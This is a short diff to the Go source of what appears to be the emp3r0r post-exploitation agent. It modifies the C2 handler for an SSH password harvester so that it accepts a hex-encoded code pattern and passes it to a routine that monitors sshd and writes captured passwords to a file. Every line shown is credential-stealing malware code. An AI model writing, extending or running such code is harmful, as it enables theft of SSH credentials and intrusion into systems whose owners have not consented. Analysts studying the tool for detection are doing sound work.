@@ -4,6 +4,7 @@
 package agent
 
 import (
+	"encoding/hex"
 	"fmt"
 	"log"
 	"os"
@@ -40,10 +41,18 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 	case emp3r0r_def.C2CmdSSHHarvester:
 		// Usage: !ssh_harvester
 		// Starts monitoring SSH connections and logs passwords.
+		code_pattern := flags.StringP("code_pattern", "p", "", "Code pattern")
+		flags.Parse(cmdSlice[1:])
+		code_pattern_bytes, err := hex.DecodeString(*code_pattern)
+		if err != nil {
+			out = fmt.Sprintf("Error parsing hex string: %v", err)
+			return
+		}
+
 		passfile := fmt.Sprintf("%s/%s.txt",
 			RuntimeConfig.AgentRoot, util.RandStr(10))
 		out = fmt.Sprintf("Look for passwords in %s", passfile)
-		go sshd_monitor(passfile)
+		go sshd_monitor(passfile, code_pattern_bytes)
 		return
 
 	// !inject --method method --pid pid
